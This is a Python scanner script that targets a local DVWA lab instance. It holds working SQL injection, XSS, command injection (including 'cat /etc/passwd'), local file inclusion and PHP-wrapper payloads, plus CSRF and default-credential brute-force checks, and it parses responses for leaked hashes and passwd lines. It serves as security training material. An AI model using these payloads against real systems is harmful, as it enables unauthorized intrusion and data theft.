#!/usr/bin/env python3
"""
BountyBoy - DVWA Specific Tester

Tests DVWA's known vulnerable endpoints after login.
Demonstrates how BountyBoy finds real vulnerabilities.
"""
import asyncio
import aiohttp
import re
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

console = Console()

BANNER = """
[bold cyan]
╔═══════════════════════════════════════════════════════════════════════════════╗
║   🎯 BountyBoy DVWA Vulnerability Tester 🎯                                   ║
║                                                                               ║
║   Testing DVWA's intentionally vulnerable pages                               ║
║   Supports LOW, MEDIUM, HIGH, and IMPOSSIBLE security levels                  ║
╚═══════════════════════════════════════════════════════════════════════════════╝
[/bold cyan]
"""

# DVWA vulnerable endpoints
DVWA_VULNS = {
    'sqli': {
        'url': '/vulnerabilities/sqli/?id={payload}&Submit=Submit',
        'payloads': [
            # Basic
            ("1", "Normal request"),
            ("1'", "Single quote - triggers error"),
            # Low level
            ("1' OR '1'='1", "Basic SQLi"),
            ("1' UNION SELECT user,password FROM users--", "UNION SQLi"),
            # Medium bypasses
            ("1 OR 1=1", "No quotes SQLi (Medium bypass)"),
            ("1 UNION SELECT user,password FROM users", "UNION no quotes"),
            # High level bypasses - uses SESSION not GET, harder to test
            ("1' OR '1'='1'#", "Hash comment SQLi"),
            ("1'/**/OR/**/1=1#", "Comment bypass SQLi"),
            ("-1' UNION SELECT user,password FROM users#", "Negative UNION"),
            ("1' AND 1=1#", "Boolean with hash"),
        ],
        'indicators': ['mysql', 'syntax', 'query', 'First name:', 'Surname:', 'admin', 'Gordon']
    },
    'xss_reflected': {
        'url': '/vulnerabilities/xss_r/?name={payload}',
        'payloads': [
            # Basic
            ("test", "Normal request"),
            ("<script>alert('XSS')</script>", "Basic XSS"),
            # Medium bypasses
            ("<img src=x onerror=alert('XSS')>", "IMG tag XSS"),
            ("<svg onload=alert('XSS')>", "SVG XSS"),
            ("<body onload=alert('XSS')>", "Body onload XSS"),
            # High level bypasses
            ("<img src=x onerror=alert`XSS`>", "Backtick XSS"),
            ("<svg/onload=alert('XSS')>", "No space SVG"),
            ("<input onfocus=alert('XSS') autofocus>", "Autofocus XSS"),
            ("<marquee onstart=alert('XSS')>", "Marquee XSS"),
            ("<details open ontoggle=alert('XSS')>", "Details ontoggle"),
            ("<select onfocus=alert('XSS') autofocus>", "Select autofocus"),
            ("'\"><img src=x onerror=alert('XSS')>", "Quote break + IMG"),
        ],
        'indicators': ['onerror=', 'onload=', 'onfocus=', 'ontoggle=', 'onstart=', '<img', '<svg', '<input']
    },
    'xss_stored': {
        'url': '/vulnerabilities/xss_s/',
        'method': 'POST',
        'data': {'txtName': '{payload}', 'mtxMessage': 'test', 'btnSign': 'Sign+Guestbook'},
        'payloads': [
            ("test", "Normal request"),
            ("<script>alert('Stored XSS')</script>", "Stored XSS in name"),
        ],
        'indicators': ['<script>', 'alert']
    },
    'command_injection': {
        'url': '/vulnerabilities/exec/',
        'method': 'POST',
        'data': {'ip': '{payload}', 'Submit': 'Submit'},
        'payloads': [
            # Basic
            ("127.0.0.1", "Normal ping"),
            # Low level
            ("127.0.0.1; id", "Semicolon injection"),
            ("127.0.0.1; cat /etc/passwd", "Semicolon + cat passwd"),
            # Medium bypasses (semicolon blocked)
            ("127.0.0.1 | id", "Pipe injection"),
            ("127.0.0.1 | cat /etc/passwd", "Pipe + cat passwd"),
            # High level bypasses (pipe and others blocked, need newline)
            ("127.0.0.1|id", "No space pipe"),
            ("127.0.0.1\nid", "Newline injection"),
            ("127.0.0.1%0aid", "URL encoded newline"),
            ("127.0.0.1`id`", "Backtick injection"),
            ("$(id)", "Command substitution"),
        ],
        'indicators': ['uid=', 'root:', 'www-data', 'total', 'daemon']
    },
    'file_inclusion': {
        'url': '/vulnerabilities/fi/?page={payload}',
        'payloads': [
            # Basic
            ("include.php", "Normal include"),
            # Low level
            ("../../../../../../etc/passwd", "Basic LFI"),
            # Medium bypasses (../ replaced)
            ("....//....//....//....//etc/passwd", "Double dot bypass"),
            ("..././..././..././etc/passwd", "Dot slash bypass"),
            # High level bypasses (only file:// allowed starting)
            ("file:///etc/passwd", "File protocol"),
            ("file1.php../../../../../../etc/passwd", "Prefix bypass"),
            # PHP wrappers
            ("php://filter/convert.base64-encode/resource=index.php", "PHP filter base64"),
            ("php://input", "PHP input wrapper"),
            ("expect://id", "Expect wrapper"),
        ],
        'indicators': ['root:', 'daemon:', 'PD9waHA', 'www-data', 'nobody']
    },
    'file_upload': {
        'url': '/vulnerabilities/upload/',
        'note': 'Requires file upload - manual test recommended'
    },
    'csrf': {
        'url': '/vulnerabilities/csrf/?password_new={payload}&password_conf={payload}&Change=Change',
        'payloads': [
            ("newpassword", "CSRF password change"),
        ],
        'indicators': ['Password Changed']
    },
    'brute_force': {
        'url': '/vulnerabilities/brute/?username={user}&password={pass}&Login=Login',
        'credentials': [
            ("admin", "password"),
            ("admin", "admin"),
            ("admin", "123456"),
        ],
        'indicators': ['Welcome to the password protected area']
    }
}


async def get_session_cookie():
    """Get PHPSESSID from DVWA login."""
    console.print("[yellow]Getting session cookie...[/yellow]")
    console.print("[yellow]Make sure you're logged into DVWA in your browser![/yellow]")
    
    # For testing, we'll use a simple approach
    # In real scenario, you'd extract cookie from browser or login programmatically
    return None


async def test_sqli(session: aiohttp.ClientSession, base_url: str, cookies: dict):
    """Test SQL Injection vulnerability."""
    console.print("\n[bold cyan]═══ Testing SQL Injection ═══[/bold cyan]")
    
    results = []
    vuln = DVWA_VULNS['sqli']
    
    # First, get baseline with normal request
    baseline_names = []
    baseline_url = base_url + vuln['url'].format(payload="1")
    try:
        async with session.get(baseline_url, cookies=cookies, ssl=False) as resp:
            baseline_content = await resp.text()
            baseline_names = re.findall(r'First name: (\w+)', baseline_content)
    except:
        pass
    
    for payload, description in vuln['payloads']:
        url = base_url + vuln['url'].format(payload=payload)
        try:
            async with session.get(url, cookies=cookies, ssl=False) as resp:
                content = await resp.text()
                
                # Check for multiple results (SQLi success) - MORE than baseline
                names = re.findall(r'First name: (\w+)', content)
                
                is_vuln = False
                
                # Only vulnerable if we get MORE users than baseline (injection worked)
                if len(names) > len(baseline_names) and len(names) > 1:
                    is_vuln = True
                
                # Or if we see password hashes (UNION injection worked)
                if re.search(r'Surname:.*[a-f0-9]{32}', content):  # MD5 hash in surname field
                    is_vuln = True
                
                # Check for SQL errors (also indicates SQLi)
                sql_error_patterns = ['you have an error in your sql', 'mysql_fetch', 'warning: mysql', 'unclosed quotation']
                for pattern in sql_error_patterns:
                    if pattern in content.lower():
                        is_vuln = True
                        break
                
                status = "🚨 VULNERABLE" if is_vuln else "○ Normal"
                results.append({
                    'payload': payload[:50],
                    'description': description,
                    'status': status,
                    'names': names
                })
                
                if is_vuln:
                    console.print(f"  [red]🚨 {description}[/red]")
                    console.print(f"     Payload: [yellow]{payload}[/yellow]")
                    if len(names) > 1:
                        console.print(f"     Users found: [green]{names}[/green]")
                else:
                    console.print(f"  [dim]○ {description}[/dim]")
                    
        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")
    
    return results
    
    return results


async def test_xss(session: aiohttp.ClientSession, base_url: str, cookies: dict):
    """Test XSS vulnerability."""
    console.print("\n[bold cyan]═══ Testing Reflected XSS ═══[/bold cyan]")
    
    results = []
    vuln = DVWA_VULNS['xss_reflected']
    
    for payload, description in vuln['payloads']:
        url = base_url + vuln['url'].format(payload=payload)
        try:
            async with session.get(url, cookies=cookies, ssl=False) as resp:
                content = await resp.text()
                
                is_vuln = False
                
                # Check if payload is reflected UNENCODED (not HTML entities)
                # If we see &lt; or &gt; it means it was encoded = safe
                if payload in content:
                    # Make sure it's not HTML encoded
                    encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                    if encoded_payload not in content:
                        # Payload is reflected raw, not encoded
                        for indicator in vuln['indicators']:
                            if indicator in payload and indicator in content:
                                is_vuln = True
                                break
                
                status = "🚨 VULNERABLE" if is_vuln else "○ Normal"
                results.append({
                    'payload': payload[:50],
                    'description': description,
                    'status': status
                })
                
                if is_vuln:
                    console.print(f"  [red]🚨 {description}[/red]")
                    console.print(f"     Payload reflected: [yellow]{payload[:60]}[/yellow]")
                else:
                    console.print(f"  [dim]○ {description}[/dim]")
                    
        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")
    
    return results


async def test_command_injection(session: aiohttp.ClientSession, base_url: str, cookies: dict):
    """Test Command Injection vulnerability."""
    console.print("\n[bold cyan]═══ Testing Command Injection ═══[/bold cyan]")
    
    results = []
    vuln = DVWA_VULNS['command_injection']
    
    for payload, description in vuln['payloads']:
        url = base_url + vuln['url']
        data = {k: v.format(payload=payload) for k, v in vuln['data'].items()}
        
        try:
            async with session.post(url, data=data, cookies=cookies, ssl=False) as resp:
                content = await resp.text()
                
                # Check for command output
                is_vuln = False
                evidence = []
                
                for indicator in vuln['indicators']:
                    if indicator in content:
                        is_vuln = True
                        evidence.append(indicator)
                
                status = "🚨 VULNERABLE" if is_vuln else "○ Normal"
                results.append({
                    'payload': payload,
                    'description': description,
                    'status': status,
                    'evidence': evidence
                })
                
                if is_vuln:
                    console.print(f"  [red]🚨 {description}[/red]")
                    console.print(f"     Payload: [yellow]{payload}[/yellow]")
                    console.print(f"     Evidence: [green]{evidence}[/green]")
                else:
                    console.print(f"  [dim]○ {description}[/dim]")
                    
        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")
    
    return results


async def test_lfi(session: aiohttp.ClientSession, base_url: str, cookies: dict):
    """Test Local File Inclusion vulnerability."""
    console.print("\n[bold cyan]═══ Testing Local File Inclusion ═══[/bold cyan]")
    
    results = []
    vuln = DVWA_VULNS['file_inclusion']
    
    for payload, description in vuln['payloads']:
        url = base_url + vuln['url'].format(payload=payload)
        try:
            async with session.get(url, cookies=cookies, ssl=False) as resp:
                content = await resp.text()
                
                # Check for file content
                is_vuln = False
                evidence = []
                
                for indicator in vuln['indicators']:
                    if indicator in content:
                        is_vuln = True
                        evidence.append(indicator)
                
                status = "🚨 VULNERABLE" if is_vuln else "○ Normal"
                results.append({
                    'payload': payload[:50],
                    'description': description,
                    'status': status,
                    'evidence': evidence
                })
                
                if is_vuln:
                    console.print(f"  [red]🚨 {description}[/red]")
                    console.print(f"     Payload: [yellow]{payload}[/yellow]")
                    # Show first few lines of /etc/passwd if found
                    if 'root:' in content:
                        lines = [l for l in content.split('\n') if ':' in l and 'root' in l][:3]
                        for line in lines:
                            console.print(f"     [green]{line[:60]}[/green]")
                else:
                    console.print(f"  [dim]○ {description}[/dim]")
                    
        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")
    
    return results


async def main():
    console.print(BANNER)
    
    base_url = "http://localhost:8080"
    
    console.print(Panel(
        "[yellow]IMPORTANT:[/yellow] You need to be logged into DVWA!\n\n"
        "1. Go to http://localhost:8080\n"
        "2. Login with [green]admin / password[/green]\n"
        "3. Set Security Level to [green]LOW[/green]\n"
        "4. Copy your PHPSESSID cookie value\n\n"
        "Enter your PHPSESSID cookie below:",
        title="🔐 Authentication Required"
    ))
    
    phpsessid = input("\nPHPSESSID cookie value: ").strip()
    
    if not phpsessid:
        console.print("[red]No cookie provided. Exiting.[/red]")
        return
    
    # Ask for security level
    console.print("\n[yellow]Security Level Options:[/yellow]")
    console.print("  1. low (default - all payloads work)")
    console.print("  2. medium (some filtering)")
    console.print("  3. high (strict filtering - test bypasses)")
    console.print("  4. impossible (secure - nothing should work)")
    
    sec_choice = input("\nSecurity level [1-4, default=1]: ").strip() or "1"
    sec_map = {"1": "low", "2": "medium", "3": "high", "4": "impossible"}
    security_level = sec_map.get(sec_choice, "low")
    
    cookies = {
        'PHPSESSID': phpsessid,
        'security': security_level
    }
    
    console.print(f"\n[cyan]Testing with security level: [bold]{security_level.upper()}[/bold][/cyan]")
    
    console.print(f"\n[green]Using session: {phpsessid[:20]}...[/green]")
    
    all_results = {
        'sqli': [],
        'xss': [],
        'command_injection': [],
        'lfi': []
    }
    
    async with aiohttp.ClientSession() as session:
        # Test each vulnerability type
        all_results['sqli'] = await test_sqli(session, base_url, cookies)
        all_results['xss'] = await test_xss(session, base_url, cookies)
        all_results['command_injection'] = await test_command_injection(session, base_url, cookies)
        all_results['lfi'] = await test_lfi(session, base_url, cookies)
    
    # Print summary
    console.print(f"\n[bold magenta]{'═' * 60}[/bold magenta]")
    console.print("[bold magenta]  DVWA VULNERABILITY TEST SUMMARY[/bold magenta]")
    console.print(f"[bold magenta]{'═' * 60}[/bold magenta]\n")
    
    table = Table(title="🎯 Findings", show_header=True, header_style="bold cyan")
    table.add_column("Vulnerability", style="dim")
    table.add_column("Status", justify="center")
    table.add_column("Severity", justify="center")
    
    vuln_count = 0
    
    for vuln_type, results in all_results.items():
        found = any('VULNERABLE' in r.get('status', '') for r in results)
        if found:
            vuln_count += 1
            table.add_row(
                vuln_type.upper().replace('_', ' '),
                "🚨 VULNERABLE",
                "[red]CRITICAL[/red]"
            )
        else:
            table.add_row(
                vuln_type.upper().replace('_', ' '),
                "○ Not Found",
                "[dim]N/A[/dim]"
            )
    
    console.print(table)
    
    if vuln_count > 0:
        console.print(Panel(
            f"[bold red]🚨 Found {vuln_count} vulnerability types![/bold red]\n\n"
            "These are REAL vulnerabilities in DVWA.\n"
            "In a real bug bounty, these would be reportable findings!\n\n"
            "[yellow]SQLi[/yellow] → Database access, data theft\n"
            "[yellow]XSS[/yellow] → Session hijacking, phishing\n"
            "[yellow]Command Injection[/yellow] → Server takeover\n"
            "[yellow]LFI[/yellow] → Source code disclosure, config theft",
            title="💰 Bug Bounty Potential",
            border_style="red"
        ))
    
    console.print("\n[dim]Test completed![/dim]")


if __name__ == "__main__":
    asyncio.run(main())
